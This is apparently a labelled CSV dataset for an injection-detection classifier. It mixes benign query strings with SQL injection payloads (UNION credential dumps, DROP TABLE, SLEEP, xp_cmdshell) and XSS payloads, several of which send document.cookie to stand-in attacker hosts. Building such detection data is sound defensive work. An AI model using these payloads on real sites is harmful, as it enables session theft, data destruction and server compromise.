payload,label
theme=dark&price_max=8052&email=surakarta@example.com,benign
'; DROP TABLE users; --,sqli
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
' OR 'a'='a,sqli
<script>document.location='http://evil.example/'+document.cookie</script>,xss
""" UNION SELECT table_name FROM information_schema.tables --",sqli
view=grid&redirect=/home&coupon=phone,benign
<style>@import 'http://attacker.test/xss.css';</style>,xss
color=echo,benign
offset=9851,benign
redirect=/home&token=1ecc59d,benign
1 OR 1=1,sqli
size=m&session=25212b8,benign
limit=6376&price_min=6289&view=grid,benign
theme=dark&sort=desc,benign
' OR 1=1#,sqli
city=foxtrot&view=grid&search=orders,benign
qty=7564,benign
token=1003a3f&limit=4755,benign
1' AND 1=1 --,sqli
page=6071&format=json,benign
<style>@import 'http://evil.example/xss.css';</style>,xss
' OR 'a'='a,sqli
""" OR ""1""=""1",sqli
name=camera&coupon=invoice&currency=usd,benign
<script>alert('xss')</script>,xss
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
price_max=2505,benign
color=alice&email=settings@example.com&price_max=6484,benign
qty=9829&sort=desc,benign
<script>alert(document.cookie)</script>,xss
q=invoice&lang=en&currency=usd,benign
offset=8811,benign
1 OR 1=1,sqli
<script>new Image().src='http://evil.example/?c='+document.cookie;</script>,xss
' OR SLEEP(5)='0,sqli
"<a href=""javascript:alert(1)"">click</a>",xss
color=budi,benign
' OR '1'='1,sqli
<script>new Image().src='http://evil.example/?c='+document.cookie;</script>,xss
<script>alert(document.cookie)</script>,xss
<video><source onerror=alert(1)></video>,xss
sort=desc&lang=id&session=25c35ab,benign
email=surakarta@example.com&q=delta&category=shoes,benign
'; DROP TABLE users; --,sqli
theme=dark&search=budi,benign
' OR '1'='1,sqli
<div onmouseover=alert(1)>hover</div>,xss
sort=asc&qty=8317,benign
category=invoice&name=invoice&offset=2585,benign
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
callback=shoes&price_max=5861&sort=asc,benign
' HAVING 1=1 --,sqli
page=8857,benign
<div onmouseover=alert(1)>hover</div>,xss
1; EXEC xp_cmdshell('dir') --,sqli
lang=en&id=7103&theme=dark,benign
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
theme=dark&session=36829ba&lang=id,benign
name=surakarta&email=foxtrot@example.com&search=book,benign
' OR '1'='1,sqli
' OR SLEEP(5)='0,sqli
' GROUP BY password HAVING 1=1 --,sqli
limit=6493&qty=4897&lang=id,benign
' HAVING 1=2 --,sqli
page=8997&city=foxtrot,benign
' OR 1=1 --,sqli
ref=echo&sort=desc&view=grid,benign
' OR 'a'='a,sqli
search=invoice&lang=en,benign
token=5448ae3&name=alice,benign
callback=book,benign
size=m&email=delta@example.com&city=shoes,benign
currency=usd&lang=id&user_id=2737,benign
category=orders&lang=id,benign
' OR 1=1#,sqli
'><script>alert(1)</script>,xss
sort=desc&ref=dashboard&currency=usd,benign
' OR 1=1 --,sqli
""" OR ""1""=""1",sqli
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
<iframe src=javascript:alert(1)>,xss
email=echo@example.com&format=json&lang=id,benign
redirect=/home&offset=3071,benign
callback=orders&token=388ea15,benign
' GROUP BY password HAVING 1=1 --,sqli
<script>alert(document.cookie)</script>,xss
<body onload=alert('xss')>,xss
lang=id&offset=1930,benign
<script>document.location='http://evil.example/'+document.cookie</script>,xss
session=5c365a3&email=alice@example.com&city=settings,benign
ref=profile&qty=7836,benign
' OR 4=1 --,sqli
"' UNION SELECT NULL, NULL, NULL --",sqli
1' AND SLEEP(5) --,sqli
<script>new Image().src='http://bad-host.example/?c='+document.cookie;</script>,xss
<div onmouseover=alert(1)>hover</div>,xss
price_max=5682&qty=341,benign
<body onload=alert('xss')>,xss
<script>alert(document.cookie)</script>,xss
coupon=laptop&q=echo,benign
lang=en&lang=id,benign
'><script>alert(1)</script>,xss
"""><script>alert(1)</script>",xss
' OR EXISTS(SELECT * FROM users) --,sqli
"<a href=""javascript:alert(1)"">click</a>",xss
<script>new Image().src='http://bad-host.example/?c='+document.cookie;</script>,xss
city=laptop&callback=citra,benign
offset=6424&coupon=orders&lang=id,benign
category=budget&color=laptop,benign
' OR EXISTS(SELECT * FROM users) --,sqli
ref=citra&size=m,benign
""" UNION SELECT table_name FROM information_schema.tables --",sqli
size=m&price_max=6303,benign
price_max=1877&qty=1772&callback=echo,benign
sort=desc&tab=orders,benign
<video><source onerror=alert(1)></video>,xss
token=1b29664&redirect=/home,benign
offset=3784&price_max=3784&price_min=1303,benign
lang=en&id=1082&ref=shoes,benign
' OR '1'='1,sqli
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
category=shoes&coupon=foxtrot,benign
price_min=879,benign
lang=en&session=321d881&token=cb35f4,benign
'><script>alert(1)</script>,xss
'><script>alert(1)</script>,xss
'; DROP TABLE users; --,sqli
session=2af0dfa&currency=usd&coupon=foxtrot,benign
limit=591&price_max=5&search=report,benign
category=orders&tab=profile,benign
<video><source onerror=alert(1)></video>,xss
currency=usd&price_max=426,benign
<script>document.location='http://bad-host.example/'+document.cookie</script>,xss
<div onmouseover=alert(1)>hover</div>,xss
session=51786a1&sort=desc,benign
"' UNION SELECT username, password FROM users --",sqli
user_id=1999,benign
'; DROP TABLE users; --,sqli
qty=8634,benign
1' AND SLEEP(5) --,sqli
<script>document.location='http://evil.example/'+document.cookie</script>,xss
<script>new Image().src='http://evil.example/?c='+document.cookie;</script>,xss
session=2b5c026,benign
category=citra&limit=7450,benign
'><script>alert(1)</script>,xss
callback=foxtrot&session=3bd3d6a&sort=desc,benign
currency=usd&lang=en&callback=alice,benign
1' AND 1=1 --,sqli
session=1bc27d3&token=1f1099f&sort=asc,benign
callback=profile&view=grid&lang=id,benign
email=jakarta@example.com&name=book&coupon=foxtrot,benign
coupon=dashboard&page=9131,benign
<body onload=alert('xss')>,xss
search=surakarta&sort=desc&currency=usd,benign
session=43e88d9&q=dashboard&sort=asc,benign
<div onmouseover=alert(1)>hover</div>,xss
email=budi@example.com&color=phone&session=441fbd4,benign
category=alice,benign
id=9169,benign
price_min=3257&lang=en&session=3e59558,benign
' OR 1=3#,sqli
<style>@import 'http://evil.example/xss.css';</style>,xss
theme=dark&view=grid,benign
price_max=5330,benign
callback=alice&price_max=9695,benign
admin' --,sqli
name=budi&ref=surakarta,benign
color=shoes,benign
callback=citra&limit=3155&sort=desc,benign
search=profile,benign
<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
id=3611&ref=orders,benign
redirect=/home&ref=surakarta,benign
callback=phone&email=foxtrot@example.com,benign
' OR 'a'='a,sqli
sort=desc&coupon=citra&lang=en,benign
<img src=x onerror=alert(1)>,xss
color=surakarta&format=json,benign
price_max=4604,benign
<iframe src=javascript:alert(1)>,xss
<script>alert(document.cookie)</script>,xss
currency=usd&user_id=4010&session=1213d86,benign
' OR SLEEP(5)='0,sqli
page=6438,benign
user_id=4054&limit=2072,benign
1' AND SLEEP(5) --,sqli
<input onfocus=alert(1) autofocus>,xss
token=3d92027,benign
price_max=619,benign
<script>document.location='http://attacker.test/'+document.cookie</script>,xss
<body onload=alert('xss')>,xss
' OR '1'='1,sqli
limit=1038&lang=en&callback=phone,benign
<div onmouseover=alert(1)>hover</div>,xss
user_id=2236&lang=en,benign
<script>new Image().src='http://bad-host.example/?c='+document.cookie;</script>,xss
<div onmouseover=alert(1)>hover</div>,xss
<script>alert(document.cookie)</script>,xss
<svg onload=alert(1)>,xss
city=phone&q=surakarta,benign
<body onload=alert('xss')>,xss
qty=5153&session=294d57e,benign
""" OR ""1""=""1",sqli
') OR ('1'='1,sqli
'; DROP TABLE users; --,sqli
"' UNION SELECT username, password FROM users --",sqli
<img src=x onerror=alert(1)>,xss
<div onmouseover=alert(1)>hover</div>,xss
ref=shoes&name=budi&page=7488,benign
'; DROP TABLE users; --,sqli
"""><script>alert(1)</script>",xss
city=budget&session=465d793,benign
theme=dark&sort=asc&price_max=673,benign
name=report&redirect=/home&qty=3830,benign
redirect=/home&user_id=2880,benign
<body onload=alert('xss')>,xss
sort=desc&id=2287&callback=echo,benign
theme=dark&q=jakarta&sort=desc,benign
<script>document.location='http://evil.example/'+document.cookie</script>,xss
<iframe src=javascript:alert(1)>,xss
price_min=3626,benign
price_min=6130&search=phone,benign
ref=laptop&limit=6966,benign
search=settings&lang=en&format=json,benign
<details open ontoggle=alert(1)>,xss
name=phone,benign
tab=echo&sort=desc,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
user_id=5680&view=grid,benign
<script>new Image().src='http://evil.example/?c='+document.cookie;</script>,xss
session=598838f,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
' GROUP BY password HAVING 1=1 --,sqli
"""><script>alert(1)</script>",xss
tab=foxtrot&sort=desc&callback=delta,benign
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
qty=9235&ref=book&price_max=7360,benign
"' UNION SELECT username, password FROM users --",sqli
offset=1331,benign
' OR EXISTS(SELECT * FROM users) --,sqli
' OR EXISTS(SELECT * FROM users) --,sqli
"' UNION SELECT username, password FROM users --",sqli
<script>alert(document.cookie)</script>,xss
ref=laptop&name=alice&q=delta,benign
price_min=3058,benign
' HAVING 1=1 --,sqli
callback=invoice&sort=desc,benign
offset=7020&callback=budget&price_min=8349,benign
' OR SLEEP(5)='0,sqli
'; DROP TABLE users; --,sqli
color=surakarta&tab=budget&token=2ad86cd,benign
<details open ontoggle=alert(1)>,xss
ref=budi&theme=dark&size=m,benign
user_id=9442&page=917&callback=dashboard,benign
color=foxtrot&email=surakarta@example.com&tab=laptop,benign
1; EXEC xp_cmdshell('dir') --,sqli
' OR 'a'='a,sqli
'><script>alert(1)</script>,xss
<svg onload=alert(1)>,xss
price_min=8619&category=book&id=8162,benign
lang=en&theme=dark&price_min=2659,benign
token=2148fe6&id=307,benign
' OR 'a'='a,sqli
<img src=x onerror=this.src='http://evil.example/'+document.cookie>,xss
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
session=523ae36&search=surakarta,benign
coupon=budi&size=m,benign
<style>@import 'http://c2.example/xss.css';</style>,xss
<style>@import 'http://evil.example/xss.css';</style>,xss
format=json&redirect=/home,benign
id=6299,benign
theme=dark&redirect=/home,benign
1' AND 1=1 --,sqli
"<a href=""javascript:alert(1)"">click</a>",xss
coupon=phone&qty=1329&sort=desc,benign
callback=profile&category=phone,benign
"""><script>alert(1)</script>",xss
') OR ('1'='1,sqli
view=grid&name=jakarta,benign
<script>fetch('http://attacker.test/steal?c='+document.cookie)</script>,xss
tab=delta&sort=asc&price_min=7497,benign
qty=3250&format=json,benign
ref=jakarta,benign
callback=dashboard&format=json,benign
1' AND 1=1 --,sqli
theme=dark&lang=id,benign
color=shoes&session=3a5cf08&sort=asc,benign
1 OR 1=6,sqli
lang=id&search=alice,benign
') OR ('1'='1,sqli
user_id=7274&size=m&view=grid,benign
offset=7362,benign
1; EXEC xp_cmdshell('dir') --,sqli
admin' --,sqli
limit=9661&currency=usd,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
page=1216&lang=id&name=settings,benign
session=103d51c&redirect=/home,benign
size=m&email=foxtrot@example.com&token=2d229c6,benign
""" UNION SELECT table_name FROM information_schema.tables --",sqli
<script>fetch('http://c2.example/steal?c='+document.cookie)</script>,xss
<div onmouseover=alert(1)>hover</div>,xss
' OR SLEEP(5)='0,sqli
theme=dark&lang=en&offset=9219,benign
' OR SLEEP(4)='0,sqli
<marquee onstart=alert(1)>,xss
') OR ('1'='1,sqli
<svg onload=alert(1)>,xss
' OR 1=1 --,sqli
admin' --,sqli
qty=610,benign
category=invoice,benign
tab=orders&limit=2855,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
1' AND 7=1 --,sqli
view=grid&q=book&redirect=/home,benign
ref=phone&limit=8614,benign
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
'; DROP TABLE users; --,sqli
<style>@import 'http://evil.example/xss.css';</style>,xss
redirect=/home&format=json,benign
1' AND 1=1 --,sqli
price_min=660&user_id=1930,benign
name=budget&id=7730&page=2459,benign
user_id=1295,benign
' HAVING 1=1 --,sqli
'; DROP TABLE users; --,sqli
qty=3383&currency=usd,benign
sort=desc&lang=id,benign
' OR 1=1 --,sqli
sort=asc&category=delta&size=m,benign
"<a href=""javascript:alert(1)"">click</a>",xss
<body onload=alert('xss')>,xss
coupon=settings&search=phone&format=json,benign
' OR 9=6#,sqli
<script>alert(document.cookie)</script>,xss
1' AND 1=1 --,sqli
<script>new Image().src='http://evil.example/?c='+document.cookie;</script>,xss
price_max=1590&email=settings@example.com&category=camera,benign
admin' --,sqli
token=3294428&price_max=318&offset=8765,benign
coupon=laptop&lang=id&sort=asc,benign
email=orders@example.com,benign
1 OR 1=1,sqli
' OR SLEEP(6)='0,sqli
' OR EXISTS(SELECT * FROM users) --,sqli
lang=id,benign
"' UNION SELECT NULL, NULL, NULL --",sqli
1' AND SLEEP(9) --,sqli
"""><script>alert(1)</script>",xss
offset=7389&limit=9551,benign
' OR EXISTS(SELECT * FROM users) --,sqli
<script>new Image().src='http://c2.example/?c='+document.cookie;</script>,xss
' OR 1=1#,sqli
qty=6281&email=surakarta@example.com,benign
"' UNION SELECT username, password FROM users --",sqli
callback=invoice&q=budget&size=m,benign
callback=profile&tab=settings&page=6077,benign
ref=book&category=surakarta,benign
qty=8690&redirect=/home&coupon=invoice,benign
view=grid&color=profile&redirect=/home,benign
1 OR 1=1,sqli
') OR ('1'='1,sqli
session=5384e39&offset=8562&category=report,benign
1; EXEC xp_cmdshell('dir') --,sqli
redirect=/home&category=book&search=jakarta,benign
category=profile&limit=3756&callback=phone,benign
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
<body onload=alert('xss')>,xss
name=alice&offset=9677&search=report,benign
<img src=x onerror=this.src='http://evil.example/'+document.cookie>,xss
"""><script>alert(1)</script>",xss
name=budget&token=4502d5f&page=8703,benign
' OR 1=1#,sqli
lang=en&ref=jakarta&offset=2360,benign
name=settings,benign
price_min=2435&size=m&email=delta@example.com,benign
"' UNION SELECT username, password FROM users --",sqli
limit=3332&offset=1296,benign
<body onload=alert('xss')>,xss
1' AND 1=1 --,sqli
session=3b63c84&page=9570,benign
offset=797&redirect=/home&city=dashboard,benign
<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
<input onfocus=alert(1) autofocus>,xss
coupon=camera&sort=asc,benign
lang=id&email=orders@example.com&city=jakarta,benign
' OR 'a'='a,sqli
<script>new Image().src='http://bad-host.example/?c='+document.cookie;</script>,xss
search=dashboard&sort=asc&offset=6910,benign
'><script>alert(1)</script>,xss
<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
limit=7877,benign
<details open ontoggle=alert(1)>,xss
size=m&id=2589,benign
<body onload=alert('xss')>,xss
redirect=/home&price_max=1597&email=invoice@example.com,benign
price_max=1626,benign
1; EXEC xp_cmdshell('dir') --,sqli
offset=50&view=grid,benign
view=grid&sort=desc&size=m,benign
qty=9176&page=4624&id=7074,benign
offset=3506&callback=delta&email=camera@example.com,benign
<body onload=alert('xss')>,xss
1; EXEC xp_cmdshell('dir') --,sqli
ref=budi&search=settings,benign
'><script>alert(1)</script>,xss
""" UNION SELECT table_name FROM information_schema.tables --",sqli
<marquee onstart=alert(1)>,xss
price_max=3181&user_id=5913&sort=desc,benign
'; DROP TABLE users; --,sqli
' HAVING 1=1 --,sqli
callback=echo&format=json,benign
' OR 1=1#,sqli
<details open ontoggle=alert(1)>,xss
email=profile@example.com,benign
page=6549&email=foxtrot@example.com,benign
format=json&session=583cdc0&search=profile,benign
""" OR ""1""=""1",sqli
""" OR ""1""=""1",sqli
size=m&format=json&price_max=588,benign
admin' --,sqli
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
<div onmouseover=alert(1)>hover</div>,xss
<div onmouseover=alert(1)>hover</div>,xss
<svg onload=alert(1)>,xss
<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
email=report@example.com&price_min=6395&id=1602,benign
id=1536,benign
lang=id&sort=desc,benign
city=foxtrot&format=json&lang=en,benign
id=5811&email=dashboard@example.com&tab=settings,benign
' OR EXISTS(SELECT * FROM users) --,sqli
""" UNION SELECT table_name FROM information_schema.tables --",sqli
size=m,benign
"' UNION SELECT NULL, NULL, NULL --",sqli
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
currency=usd&session=21979d5,benign
price_max=4935&view=grid&size=m,benign
price_max=96&size=m,benign
<input onfocus=alert(1) autofocus>,xss
<body onload=alert('xss')>,xss
color=alice&limit=4290&coupon=foxtrot,benign
theme=dark&email=echo@example.com&name=invoice,benign
currency=usd&sort=asc&user_id=1209,benign
<script>alert('xss')</script>,xss
ref=citra&session=31c3be0,benign
offset=9160&callback=budget&tab=settings,benign
email=delta@example.com&price_min=6921&qty=1745,benign
coupon=orders,benign
page=7241,benign
' HAVING 1=1 --,sqli
""" OR ""1""=""1",sqli
admin' --,sqli
<img src=x onerror=alert(1)>,xss
' GROUP BY password HAVING 1=1 --,sqli
ref=book,benign
""" UNION SELECT table_name FROM information_schema.tables --",sqli
'; DROP TABLE users; --,sqli
' OR SLEEP(8)='0,sqli
<div onmouseover=alert(1)>hover</div>,xss
""" OR ""1""=""1",sqli
lang=id&currency=usd,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
""" OR ""1""=""1",sqli
<script>alert(document.cookie)</script>,xss
theme=dark&offset=9627,benign
lang=en&token=5b98ee9&format=json,benign
"' UNION SELECT username, password FROM users --",sqli
city=book&price_max=1295&q=delta,benign
"' UNION SELECT NULL, NULL, NULL --",sqli
city=budget&color=book&sort=asc,benign
1' AND 1=1 --,sqli
""" OR ""1""=""1",sqli
price_min=2237&page=7514&offset=5630,benign
email=laptop@example.com,benign
' OR 5=6#,sqli
<marquee onstart=alert(1)>,xss
lang=id&theme=dark&redirect=/home,benign
theme=dark&city=phone,benign
1' AND 1=1 --,sqli
limit=7542&category=budget,benign
1' AND 1=1 --,sqli
page=608&ref=citra,benign
<script>alert('xss')</script>,xss
qty=7075&theme=dark,benign
redirect=/home&token=406c182&callback=surakarta,benign
' OR EXISTS(SELECT * FROM users) --,sqli
currency=usd&coupon=profile,benign
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
category=echo&sort=desc,benign
1' AND SLEEP(4) --,sqli
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
token=28dcdad,benign
<svg onload=alert(1)>,xss
price_min=1801,benign
' HAVING 1=1 --,sqli
token=43c1a12&theme=dark&price_min=3031,benign
coupon=settings,benign
1 OR 3=4,sqli
redirect=/home&email=budget@example.com&token=28c052c,benign
"' UNION SELECT NULL, NULL, NULL --",sqli
sort=desc&limit=9418,benign
<svg onload=alert(1)>,xss
city=budi&tab=delta,benign
' OR 'a'='a,sqli
theme=dark&session=37ce1d9,benign
' GROUP BY password HAVING 1=1 --,sqli
redirect=/home&lang=id,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
<marquee onstart=alert(1)>,xss
' OR 1=1 --,sqli
' OR 1=1 --,sqli
' GROUP BY password HAVING 1=1 --,sqli
<img src=x onerror=alert(1)>,xss
<script>fetch('http://attacker.test/steal?c='+document.cookie)</script>,xss
' OR '1'='1,sqli
'; DROP TABLE users; --,sqli
"""><script>alert(1)</script>",xss
user_id=4411,benign
<input onfocus=alert(1) autofocus>,xss
city=orders&id=1085&category=orders,benign
<video><source onerror=alert(1)></video>,xss
' HAVING 5=4 --,sqli
<svg onload=alert(1)>,xss
token=3a109d3,benign
'><script>alert(1)</script>,xss
token=beafff&size=m&redirect=/home,benign
color=camera&offset=3049,benign
' OR EXISTS(SELECT * FROM users) --,sqli
limit=2466,benign
sort=desc&city=profile,benign
lang=en&session=57ce51b,benign
1; EXEC xp_cmdshell('dir') --,sqli
1 OR 1=1,sqli
qty=8814&offset=7255&currency=usd,benign
"<a href=""javascript:alert(1)"">click</a>",xss
offset=6029&q=laptop&sort=asc,benign
<script>document.location='http://evil.example/'+document.cookie</script>,xss
currency=usd&format=json&lang=en,benign
theme=dark&tab=shoes,benign
session=148e850,benign
'; DROP TABLE users; --,sqli
qty=5622&price_max=8172,benign
price_min=1084&color=shoes,benign
redirect=/home&lang=en,benign
size=m&callback=report&token=1837545,benign
limit=4199,benign
' OR EXISTS(SELECT * FROM users) --,sqli
'><script>alert(1)</script>,xss
name=report&redirect=/home,benign
color=laptop&view=grid,benign
"""><script>alert(1)</script>",xss
price_min=740,benign
<script>document.location='http://c2.example/'+document.cookie</script>,xss
<img src=x onerror=this.src='http://bad-host.example/'+document.cookie>,xss
<img src=x onerror=alert(1)>,xss
1' AND SLEEP(9) --,sqli
1 OR 1=1,sqli
<img src=x onerror=alert(1)>,xss
name=budget,benign
redirect=/home&view=grid&color=profile,benign
lang=en&coupon=budget,benign
callback=settings&view=grid,benign
"' UNION SELECT username, password FROM users --",sqli
size=m&category=jakarta&lang=en,benign
format=json&price_min=9928&offset=3420,benign
email=camera@example.com&user_id=2195&city=invoice,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
q=laptop&user_id=2234,benign
theme=dark&lang=id&ref=alice,benign
currency=usd&format=json&email=camera@example.com,benign
tab=budget&token=389ed19&limit=9346,benign
<script>new Image().src='http://c2.example/?c='+document.cookie;</script>,xss
<style>@import 'http://evil.example/xss.css';</style>,xss
sort=desc&token=2777484&lang=id,benign
<img src=x onerror=this.src='http://c2.example/'+document.cookie>,xss
offset=308&redirect=/home&token=1cf147a,benign
currency=usd&format=json,benign
<details open ontoggle=alert(1)>,xss
' OR 3=7#,sqli
sort=asc&redirect=/home,benign
<img src=x onerror=alert(1)>,xss
' OR '1'='1,sqli
theme=dark&limit=9486&ref=dashboard,benign
tab=citra&sort=asc,benign
price_min=1402&sort=desc,benign
<script>document.location='http://evil.example/'+document.cookie</script>,xss
<script>alert('xss')</script>,xss
format=json&city=camera&redirect=/home,benign
user_id=6816,benign
size=m&q=foxtrot,benign
token=329ddec&limit=6249,benign
name=echo&sort=asc,benign
size=m&token=122f063,benign
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
ref=book&price_min=7906&coupon=camera,benign
' OR '1'='1,sqli
id=2814,benign
search=echo,benign
city=settings&color=citra,benign
coupon=laptop&category=profile,benign
<div onmouseover=alert(1)>hover</div>,xss
' OR EXISTS(SELECT * FROM users) --,sqli
'; DROP TABLE users; --,sqli
'; DROP TABLE users; --,sqli
currency=usd&page=4829,benign
tab=alice,benign
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
token=3e87fc7&callback=report,benign
city=citra,benign
' OR 2=2 --,sqli
'><script>alert(1)</script>,xss
session=525c8b6,benign
coupon=budi,benign
' OR SLEEP(3)='0,sqli
"""><script>alert(1)</script>",xss
offset=9465&user_id=2263,benign
price_min=2596,benign
offset=4872&page=3701,benign
admin' --,sqli
name=settings&sort=asc&limit=1353,benign
' OR 'a'='a,sqli
offset=2436&token=4965162,benign
token=1f03855,benign
city=orders,benign
tab=settings&coupon=shoes&theme=dark,benign
city=camera&name=budi,benign
limit=7761,benign
<svg onload=alert(1)>,xss
tab=laptop,benign
'><script>alert(1)</script>,xss
q=foxtrot,benign
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
offset=1900&lang=en,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
format=json&category=delta,benign
search=book,benign
' GROUP BY password HAVING 1=1 --,sqli
color=dashboard&format=json,benign
"""><script>alert(1)</script>",xss
limit=2254,benign
ref=camera&search=dashboard&color=alice,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
<style>@import 'http://evil.example/xss.css';</style>,xss
<marquee onstart=alert(1)>,xss
<script>document.location='http://bad-host.example/'+document.cookie</script>,xss
size=m&search=shoes&qty=1102,benign
color=phone,benign
<script>document.location='http://evil.example/'+document.cookie</script>,xss
<details open ontoggle=alert(1)>,xss
' OR '1'='1,sqli
') OR ('1'='1,sqli
<iframe src=javascript:alert(1)>,xss
tab=delta&lang=id,benign
view=grid&qty=6938&callback=invoice,benign
color=surakarta&id=6879&sort=asc,benign
' OR '1'='1,sqli
') OR ('1'='1,sqli
tab=jakarta&view=grid&callback=orders,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
page=4787&city=camera,benign
"' UNION SELECT NULL, NULL, NULL --",sqli
' OR 'a'='a,sqli
email=shoes@example.com&redirect=/home&name=report,benign
<iframe src=javascript:alert(1)>,xss
<svg onload=alert(1)>,xss
' OR EXISTS(SELECT * FROM users) --,sqli
<script>new Image().src='http://evil.example/?c='+document.cookie;</script>,xss
page=8162&view=grid&sort=asc,benign
<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
email=settings@example.com,benign
search=invoice,benign
view=grid&lang=id&search=delta,benign
search=camera,benign
redirect=/home&callback=alice,benign
') OR ('1'='1,sqli
<img src=x onerror=alert(1)>,xss
size=m&name=report,benign
redirect=/home&price_max=6732&tab=foxtrot,benign
search=report,benign
<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
<video><source onerror=alert(1)></video>,xss
page=5214&search=camera&price_max=2305,benign
category=citra,benign
color=book&tab=foxtrot,benign
<script>new Image().src='http://evil.example/?c='+document.cookie;</script>,xss
format=json&email=alice@example.com,benign
city=jakarta,benign
1' AND 1=1 --,sqli
1 OR 1=1,sqli
size=m&name=citra,benign
redirect=/home&size=m&callback=surakarta,benign
color=citra,benign
q=dashboard,benign
currency=usd&city=report,benign
<iframe src=javascript:alert(1)>,xss
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
page=4302&city=dashboard&ref=budi,benign
<img src=x onerror=this.src='http://bad-host.example/'+document.cookie>,xss
view=grid&email=orders@example.com&sort=asc,benign
price_min=2689&id=3491&price_max=7249,benign
city=dashboard,benign
' OR EXISTS(SELECT * FROM users) --,sqli
redirect=/home&id=6489,benign
page=5634&size=m&lang=en,benign
price_min=9065&lang=en,benign
' OR 1=1#,sqli
<details open ontoggle=alert(1)>,xss
tab=invoice&page=7057,benign
"' UNION SELECT NULL, NULL, NULL --",sqli
<img src=x onerror=this.src='http://bad-host.example/'+document.cookie>,xss
<input onfocus=alert(1) autofocus>,xss
color=budget&tab=invoice,benign
sort=desc&redirect=/home,benign
email=echo@example.com,benign
city=shoes&email=book@example.com&search=laptop,benign
id=1114&size=m&view=grid,benign
"' UNION SELECT username, password FROM users --",sqli
ref=settings&currency=usd,benign
page=8180&q=settings,benign
page=1618&user_id=6764&ref=camera,benign
search=budi&color=book&theme=dark,benign
'; DROP TABLE users; --,sqli
tab=budi&view=grid&color=camera,benign
admin' --,sqli
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
<div onmouseover=alert(1)>hover</div>,xss
q=citra&id=4843,benign
<svg onload=alert(1)>,xss
theme=dark&size=m&qty=2318,benign
format=json&lang=id,benign
category=echo&name=delta,benign
search=foxtrot&limit=9547,benign
' OR SLEEP(5)='0,sqli
category=jakarta&price_min=480&currency=usd,benign
<body onload=alert('xss')>,xss
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
name=citra,benign
redirect=/home&limit=7420&offset=6763,benign
redirect=/home&qty=7706,benign
price_max=7917,benign
'><script>alert(1)</script>,xss
'; DROP TABLE users; --,sqli
' OR SLEEP(8)='0,sqli
callback=echo,benign
sort=asc&sort=desc,benign
<img src=x onerror=alert(1)>,xss
price_min=2939,benign
q=camera&name=book&sort=desc,benign
1' AND SLEEP(5) --,sqli
"<a href=""javascript:alert(1)"">click</a>",xss
<marquee onstart=alert(1)>,xss
admin' --,sqli
' OR 1=1 --,sqli
' OR SLEEP(5)='0,sqli
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
category=citra&offset=2030&lang=id,benign
